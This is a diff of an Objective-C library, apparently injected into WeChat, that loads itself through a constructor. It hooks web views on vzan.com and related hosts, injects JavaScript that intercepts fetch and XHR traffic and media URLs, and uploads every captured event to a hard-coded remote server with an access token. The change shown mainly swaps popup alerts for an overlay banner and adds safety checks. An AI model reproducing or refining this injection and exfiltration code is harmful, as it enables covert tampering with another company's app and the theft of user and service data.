@@ -1,6 +1,6 @@
 //
-// ALIInjectOnEnter_Popup.m
-// 进入目标 H5 才注入；注入成功&抓到URL都弹窗+复制；带安全重试避免 WeChat 闪退。
+// ALIInjectOnEnter_BannerSafe.m
+// 进入目标 H5 再注入；命中/注入用 Banner 提示 + 复制；全程上报；无 swizzle 更稳。
 // 编译：-framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
 //
 
@@ -10,23 +10,23 @@
 #import <AVFoundation/AVFoundation.h>
 #import <objc/runtime.h>
 
-#pragma mark - 配置
+#pragma mark - 参数配置
 
 static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-static const NSTimeInterval kScanInterval     = 1.0;   // 扫描 WK 窗口
+static const NSTimeInterval kScanInterval     = 1.0;   // 扫描窗口间隔
 static const NSTimeInterval kInjectDelay      = 0.50;  // 命中域名后再延迟注入
-static const NSTimeInterval kDedupeWindow     = 60.0;  // URL 去重
-static const double        kProgressThreshold = 0.55;  // 文档就绪门限
+static const NSTimeInterval kDedupeWindow     = 60.0;  // URL 去重窗口
+static const double        kProgressThreshold = 0.55;  // 注入门槛（WK 进度）
 
-static const BOOL kPopupOnInject = YES;   // 注入成功弹窗
-static const BOOL kPopupOnHit    = YES;   // 抓到 URL 弹窗
-static const BOOL kCopyOnHit     = YES;   // 抓到/注入时复制
-static const BOOL kForceUploadAll= YES;   // 兜底上报所有 URL
+static const BOOL kPopupOnInject = YES;   // 注入成功是否提示
+static const BOOL kPopupOnHit    = YES;   // 抓到 URL 是否提示
+static const BOOL kCopyOnHit     = YES;   // 提示时是否复制
+static const BOOL kForceUploadAll= YES;   // 兜底：所有 URL 都上传（便于排查）
 
-// 仅这些域名才注入
+// 只在这些域名命中时注入
 static NSArray<NSString*> *TargetHosts(void){
     return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
 }
@@ -55,59 +55,11 @@ static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
 static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
 
-#pragma mark - 小工具（安全弹窗）
+#pragma mark - 工具
 
 static inline void on_main(void(^blk)(void)){
     if (!blk) return;
     if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
-}
-
-static UIWindow *keyWin(void){
-    UIWindow *win = nil;
-    if (@available(iOS 13.0,*)) {
-        for (UIScene *s in UIApplication.sharedApplication.connectedScenes) {
-            if (![s isKindOfClass:[UIWindowScene class]]) continue;
-            UIWindowScene *sc = (UIWindowScene*)s;
-            if (sc.activationState==UISceneActivationStateForegroundActive) {
-                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
-                if (win) break;
-            }
-        }
-    }
-    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
-    return win;
-}
-
-// 可重试的安全弹窗（避免 WeChat 转场阶段崩溃）
-static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
-    if (!msg) return;
-    on_main(^{
-        __block int tries = 0;
-        void (^tryPresent)(void) = ^{
-            @try{
-                UIWindow *w = keyWin(); if (!w){ goto RETRY; }
-                UIViewController *vc = w.rootViewController; if (!vc){ goto RETRY; }
-                // 如果还有别的控制器在 present，等它结束（避免 "presenting view controllers on detached view controllers" 崩溃）
-                while (vc.presentedViewController) vc = vc.presentedViewController;
-                if (!vc.view.window){ goto RETRY; }
-
-                UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
-                if (copyText.length){
-                    [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
-                        UIPasteboard.generalPasteboard.string = copyText;
-                    }]];
-                }
-                [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
-                [vc presentViewController:ac animated:YES completion:nil];
-                return;
-            }@catch(__unused NSException *e){}
-        RETRY:
-            if (tries++ < 6){ // 最多重试 ~1.8s
-                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)), dispatch_get_main_queue(), tryPresent);
-            }
-        };
-        tryPresent();
-    });
 }
 
 static BOOL looksLikeStream(NSString *u){
@@ -131,6 +83,79 @@ static BOOL dedupe_skip(NSString *u){
         else { g_seen[u] = now; skip = NO; }
     });
     return skip;
+}
+
+#pragma mark - Banner 提示（不走 present，不会触发 WeChat 崩点）
+
+static UIWindow *ALI_BannerWin;
+static UILabel  *ALI_BannerLab;
+static dispatch_source_t ALI_BannerTimer;
+
+static void ali_banner_show(NSString *text){
+    if (!text.length) return;
+    on_main(^{
+        @try{
+            if (!ALI_BannerWin){
+                UIWindowScene *scene = nil;
+                if (@available(iOS 13.0,*)) {
+                    for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
+                        if ([s isKindOfClass:[UIWindowScene class]] &&
+                            ((UIWindowScene*)s).activationState==UISceneActivationStateForegroundActive){
+                            scene = (UIWindowScene*)s; break;
+                        }
+                    }
+                }
+                ALI_BannerWin = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
+                if (scene) ALI_BannerWin.windowScene = scene;
+                ALI_BannerWin.windowLevel = UIWindowLevelStatusBar + 10;
+                ALI_BannerWin.backgroundColor = [UIColor clearColor];
+                ALI_BannerWin.hidden = NO;
+
+                UIView *host = [[UIView alloc] initWithFrame:ALI_BannerWin.bounds];
+                host.userInteractionEnabled = NO;
+                [ALI_BannerWin addSubview:host];
+
+                CGFloat W = MIN([UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height) - 32.0;
+                ALI_BannerLab = [[UILabel alloc] initWithFrame:CGRectMake((host.bounds.size.width-W)/2.0, 48.0, W, 1)];
+                ALI_BannerLab.numberOfLines = 0;
+                ALI_BannerLab.textAlignment = NSTextAlignmentCenter;
+                ALI_BannerLab.textColor = [UIColor whiteColor];
+                ALI_BannerLab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
+                ALI_BannerLab.layer.cornerRadius = 12.0;
+                ALI_BannerLab.layer.masksToBounds = YES;
+                ALI_BannerLab.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
+                [host addSubview:ALI_BannerLab];
+            }
+
+            ALI_BannerLab.text = text;
+            CGFloat maxW = ALI_BannerLab.frame.size.width - 24.0;
+            CGSize sz = [ALI_BannerLab sizeThatFits:CGSizeMake(maxW, CGFLOAT_MAX)];
+            CGRect f  = ALI_BannerLab.frame;
+            f.size.height = sz.height + 16.0;
+            ALI_BannerLab.frame = f;
+
+            ALI_BannerWin.alpha = 0.0;
+            ALI_BannerWin.hidden = NO;
+            [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 1.0; }];
+
+            if (ALI_BannerTimer){ dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil; }
+            ALI_BannerTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
+            dispatch_source_set_timer(ALI_BannerTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.6 * NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, 0);
+            dispatch_source_set_event_handler(ALI_BannerTimer, ^{
+                [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 0.0; }
+                                 completion:^(__unused BOOL fin){ ALI_BannerWin.hidden = YES; }];
+                dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil;
+            });
+            dispatch_resume(ALI_BannerTimer);
+        }@catch(__unused NSException *e){}
+    });
+}
+
+// 兼容旧调用：复制仍生效，视觉提示用 banner
+static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
+    (void)title;
+    if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
+    ali_banner_show(msg.length ? msg : title);
 }
 
 #pragma mark - 上报
@@ -159,7 +184,7 @@ static NSString *jsonStringify(NSDictionary *obj){
     return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
 }
 
-#pragma mark - 统一事件处理（JS / 原生）
+#pragma mark - 事件处理（JS / Native）
 
 static void handleRawEvent(NSDictionary *evt){
     NSString *js = jsonStringify(evt); if (js) postText(js);
@@ -170,9 +195,12 @@ static void handleRawEvent(NSDictionary *evt){
     BOOL like = looksLikeStream(u);
     if (kForceUploadAll || like){
         if (!dedupe_skip(u)){
-            if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = u;
+            if (kPopupOnHit){
+                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = u; });
                 popup_safe(@"抓到 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
-            } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = u; }
+            }else if (kCopyOnHit){
+                on_main(^{ UIPasteboard.generalPasteboard.string = u; });
+            }
             NSDictionary *hit = @{@"type": @"JS_HIT",
                                   @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                   @"url": u,
@@ -194,13 +222,16 @@ static void handleCapturedURL(NSString *url, NSString *from){
     NSString *s = jsonStringify(evt); if (s) postText(s);
 
     if (looksLikeStream(url)){
-        if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = url;
+        if (kPopupOnHit){
+            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
             popup_safe(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
-        } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = url; }
+        }else if (kCopyOnHit){
+            on_main(^{ UIPasteboard.generalPasteboard.string = url; });
+        }
     }
 }
 
-#pragma mark - inpage JS（与前版一致）
+#pragma mark - inpage JS
 
 static NSString *inpageJS(void){
     return @
@@ -224,7 +255,7 @@ static NSString *inpageJS(void){
         "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});"
           "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
             "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
-              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url=u,method:m,status:st,ctype:ct});});}"
+              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
             "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
         "catch(e){return F.apply(this,arguments)}})();"
       "(function(){if(!('PerformanceObserver'in window)||window.__ali_perf__)return;window.__ali_perf__=true;"
@@ -242,7 +273,7 @@ static NSString *inpageJS(void){
     "}catch(e){}})();";
 }
 
-#pragma mark - WK 注入（只在命中域名时注入 + 弹窗提示）
+#pragma mark - WK 注入（命中域名才注入 + Banner 提示）
 
 @interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
 @end
@@ -268,7 +299,7 @@ static BOOL hostMatches(NSURL *url){
 }
 
 static void prime_userScript_for_allFrames(WKWebView *wv){
-    if (!wv) return;
+    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
     @try{
         WKUserContentController *ucc = wv.configuration.userContentController;
         for (WKUserScript *s in ucc.userScripts){
@@ -285,7 +316,7 @@ static void prime_userScript_for_allFrames(WKWebView *wv){
 }
 
 static void try_inject_when_ready(WKWebView *wv){
-    if (!wv) return;
+    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
     if (wv.estimatedProgress < kProgressThreshold) return;
 
     [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
@@ -297,25 +328,27 @@ static void try_inject_when_ready(WKWebView *wv){
         if (flag.boolValue) return;
 
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
             NSURL *u = wv.URL; if (!hostMatches(u)) return;
 
             objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
 
-            if (!g_handler) g_handler = [ALIMessageHandler new];
+            WKUserContentController *ucc = wv.configuration.userContentController;
             @try{
-                if ([wv.configuration.userContentController respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
-                    [wv.configuration.userContentController removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
+                if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
+                    [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                 }
-                [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
+                if (!g_handler) g_handler = [ALIMessageHandler new];
+                [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
             }@catch(__unused NSException *e){}
 
             [wv evaluateJavaScript:inpageJS() completionHandler:nil];
 
-            // 注入成功：一定弹窗提示
+            // 注入成功：Banner 提示
             if (kPopupOnInject){
-                NSString *p = wv.URL.absoluteString ?: @"";
-                if (kCopyOnHit) UIPasteboard.generalPasteboard.string = p;
-                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media）", wv.URL.host ?: @"(null)"], nil);
+                NSString *host = wv.URL.host ?: @"(null)";
+                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = (wv.URL.absoluteString ?: @""); });
+                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media）", host], nil);
             }
             NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                   @"app": @"WeChat",
@@ -331,10 +364,8 @@ static void try_inject_when_ready(WKWebView *wv){
 @end
 @implementation _ALIKVOBox
 - (void)dealloc{
-    @try{
-        [self.wv removeObserver:self forKeyPath:@"URL"];
-        [self.wv removeObserver:self forKeyPath:@"estimatedProgress"];
-    }@catch(__unused NSException *e){}
+    @try{ [self.wv removeObserver:self forKeyPath:@"URL"];
+          [self.wv removeObserver:self forKeyPath:@"estimatedProgress"]; }@catch(__unused NSException *e){}
 }
 - (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
     WKWebView *wv = (WKWebView *)object;
@@ -376,7 +407,7 @@ static void scan_loop(void){
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
-#pragma mark - AV AccessLog（不 swizzle）
+#pragma mark - AV AccessLog 监听（安全，无 swizzle）
 
 static void installAVObservers(void){
     @try{
@@ -430,8 +461,8 @@ static void installAVObservers(void){
 #pragma mark - 入口
 
 __attribute__((constructor))
-static void ALIInjectOnEnter_Popup_Init(void){
-    if (!gq)    gq    = dispatch_queue_create("com.ali.inject.onenter.popup", DISPATCH_QUEUE_SERIAL);
+static void ALIInjectOnEnter_BannerSafe_Init(void){
+    if (!gq)    gq    = dispatch_queue_create("com.ali.inject.onenter.banner", DISPATCH_QUEUE_SERIAL);
     if (!g_seen) g_seen = [NSMutableDictionary dictionary];
     scan_loop();
     installAVObservers();
